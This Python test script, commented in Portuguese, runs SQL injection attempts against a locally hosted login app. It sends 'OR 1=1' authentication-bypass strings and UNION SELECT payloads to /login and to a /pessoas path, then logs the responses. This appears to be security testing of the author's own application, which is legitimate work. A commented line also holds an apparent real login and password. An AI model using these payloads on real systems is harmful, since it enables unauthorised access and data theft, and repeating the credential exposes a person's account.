# sql_login_union_exfiltrate_var.py
# Colocar em: testes/seguranca/sql_injection/cenarios/sql_login_union_exfiltrate_var.py

import shutil
from pathlib import Path
import requests, time, datetime, urllib.parse
from pprint import pformat

SRC_DB = Path.cwd() / "pessoas_backup.db"
DEST_DB = Path.cwd() / "instance" / "pessoas.db"

OUT_FOLDER = Path("respostas") / "sql_injection" / "cenarios" / "sql_login_union_exfiltrate_var"
OUT_FOLDER.mkdir(parents=True, exist_ok=True)
OUT_FILE = OUT_FOLDER / "sql_login_union_exfiltrate_var.txt"

APP_BASE = "http://127.0.0.1:5000"
LOGIN_ENDPOINT = "/login"
PEOPLE_ENDPOINT = "/pessoas/1"  # usado para testar union em path se aplicável

# payloads para o campo 'login' e 'senha' (várias formas: bypass, union típica, union com comentários)
payloads = [
    # clássico bypass
    ("' OR '1'='1' -- ", "qualquer"),
    # tentativa UNION (ajuste número de colunas se necessário)
    # Observação: SELECT * FROM pessoa retorna colunas (id, nome, login, senha, perfil, status)
    # vamos tentar reconstruir uma linha com 6 colunas (em ordem arbitrária) para forçar sucesso do UNION
    ("' UNION SELECT 1, 'exfil_name', 'exfil_login', 'exfil_pass', 'exfil_perfil', 'exfil_status' -- ", "x"),
    # variação sem início com quote
    ("anything' UNION SELECT 1, 'a','b','c','d','e' -- ", "pass"),
    # provocar erro de sintaxe (para checar mensagens/stacktrace)
    ("' UNION SELECT 1,2,3 -- ", "p"),
    # outras tentativas combinadas
    ("' OR 1=1; -- ", "pass"),
]

def safe_write(p, txt):
    with p.open("a", encoding="utf-8") as f:
        f.write(txt + "\n")

def restore_db():
    if SRC_DB.exists():
        DEST_DB.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy(SRC_DB, DEST_DB)
        return True, f"Banco restaurado: {SRC_DB} -> {DEST_DB}"
    else:
        return False, f"Backup não encontrado em: {SRC_DB}"

def try_login(session, login_payload, senha_payload):
    url = APP_BASE + LOGIN_ENDPOINT
    data = {"login": login_payload, "senha": senha_payload}
    try:
        r = session.post(url, json=data, timeout=8)
        return {"url": url, "data": data, "status": r.status_code, "body_len": len(r.content or b""), "text_snippet": (r.text[:800] if r.text else "")}
    except Exception as e:
        return {"url": url, "data": data, "status": None, "error": repr(e)}

def try_get_people(session, payload):
    # injeta no path (se a rota for concatenada ao id direto pode funcionar)
    inj = urllib.parse.quote_plus(payload)
    url = f"{APP_BASE}{PEOPLE_ENDPOINT}+{inj}"
    try:
        r = session.get(url, timeout=8)
        return {"url": url, "status": r.status_code, "len": len(r.content or b""), "text_snippet": (r.text[:800] if r.text else "")}
    except Exception as e:
        return {"url": url, "status": None, "error": repr(e)}

def main():
    ok, msg = restore_db()
    safe_write(OUT_FILE, f"Data de execucao: {datetime.datetime.utcnow().isoformat()}Z")
    safe_write(OUT_FILE, msg)
    safe_write(OUT_FILE, "Tentativas UNION / exfiltrate no /login e no /pessoas/<id>\n")

    ses = requests.Session()
    # opcional: efetuar login normal se quiser (com credenciais conhecidas)
    # ses.post(APP_BASE + "/login", json={"login":"1566256@sga.pucminas.br","senha":"1566256"})

    for lp, sp in payloads:
        safe_write(OUT_FILE, f"\n=== Tentativa login payload ===\nlogin_payload: {lp}\nsenha_payload: {sp}\n")
        res = try_login(ses, lp, sp)
        safe_write(OUT_FILE, pformat(res))
        # small pause
        time.sleep(0.2)

        # tentar no GET /pessoas/1 também
        safe_write(OUT_FILE, f"=== Tentativa GET /pessoas com payload no path ===\npayload: {lp}\n")
        res2 = try_get_people(ses, lp)
        safe_write(OUT_FILE, pformat(res2))
        time.sleep(0.2)

    safe_write(OUT_FILE, "\nFim. Verifique respostas do servidor e traces no console para possiveis erros SQL ou linhas exfiltradas.")
    print("Feito. Verifique:", OUT_FILE)

if __name__ == "__main__":
    main()
